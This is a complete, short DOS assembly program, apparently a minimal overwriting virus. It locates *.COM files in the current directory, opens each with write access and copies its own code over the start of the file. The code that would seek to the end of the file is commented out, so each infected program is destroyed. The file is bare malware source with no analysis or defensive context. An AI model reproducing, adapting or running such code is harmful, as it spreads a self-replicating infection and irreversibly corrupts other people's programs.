.model small
.code    
FNAME   EQU     9EH   
    ORG 100H  
    
START:  

VIRUS:
    mov ah,4EH
    mov dx,OFFSET COM_FILE
    int 21H     
    
SEARCH_LP:
    jc DONE
    mov ax,3D02H 
    mov dx,FNAME
    int 21H               
    
;    xor cx,cx
;    mov dx,cx           ;cx:dx=0
;    mov ax,4202H        ; move to end of file
;    int 21H
    
    mov cx, OFFSET ENDVIR - OFFSET VIRUS
    lea dx,[di+VIRUS]  
    xchg ax,bx 
    mov ah,40H
    int 21H
    
    mov ah,3EH      
    int 21H         ;close file
    mov ah,4FH      
    int 21H         ;search for next file
    jmp SEARCH_LP  
    
DONE:  ret  

  COM_FILE        DB      '*.COM',0      
    
ENDVIR:  

END START
